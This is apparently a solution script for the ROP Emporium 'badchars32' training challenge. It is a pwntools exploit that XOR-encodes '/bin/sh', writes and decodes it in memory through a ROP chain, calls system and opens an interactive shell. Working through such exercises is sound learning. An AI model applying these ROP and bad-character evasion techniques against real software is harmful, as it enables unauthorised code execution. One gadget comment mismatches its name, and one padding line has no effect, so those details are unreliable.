#!/usr/bin/env python2
from pwn import *

# BAD CHARS
# 0x62 0x69 0x63 0x2f 0x20    0x66 0x6e 0x73
#    b    i    c    /  space     f    n    s

xor_ebx_cl          = 0x08048890 # xor byte [ebx], cl; ret;
mov_esi_to_edi      = 0x08048893 # mov dword [edi], esi; ret;
pop_ebx_ecx         = 0x08048896 # pop edx; pop ecx; ret;
pop_esi_edi         = 0x08048899 # pop esi; pop edi; ret;

usefulFunction_system   = 0x080487b7
write_data              = 0x0804a038 + 0x100

key = 0x70
string = "/bin/sh".ljust(8, '\x00')

def encrypt(string, key):
    return ''.join(map(lambda x: chr(ord(x)^key), string))

encrypted = encrypt(string, key)

# Plan:
#
# Load encrypted string in memory
# Go over each byte and xor it
# /bin/sh now in memory
# Execute

def load_whole_string(string, base_address):
    string.rjust(len(string)+(len(string)%4), '\x00') # Pads string
    payload = ""
    for i in range(0,len(string),4):
        payload += p32(pop_esi_edi)
        payload += string[i:i+4]        # esi
        payload += p32(base_address+i)  # edi
        payload += p32(mov_esi_to_edi)  # ret
    
    # Also returns number of bytes written into base_address
    return payload, len(string)  

def xor_string(string_length, base_address):
    payload = ""
    for i in range(string_length):
        payload += p32(pop_ebx_ecx)
        payload += p32(base_address+i)      # ebx
        payload += p32(0x70)                # ecx
        payload += p32(xor_ebx_cl)          # ret

    return payload

exe  = "./badchars32"
elf  = ELF(exe)
proc = process(exe)

usefulFunction_system   = 0x080487b7
write_data              = 0x0804a038 + 0x100

payload  = ""
payload += 'A'*44
payload += load_whole_string(encrypted, write_data)[0]
payload += xor_string(len(encrypted), write_data)
payload += p32(usefulFunction_system)
payload += p32(write_data)

log.info("Payload:\n" + payload.encode('hex'))
with open('payload', 'wb') as f:
    f.write(payload)

proc.recv()
proc.sendline(payload)
proc.interactive()

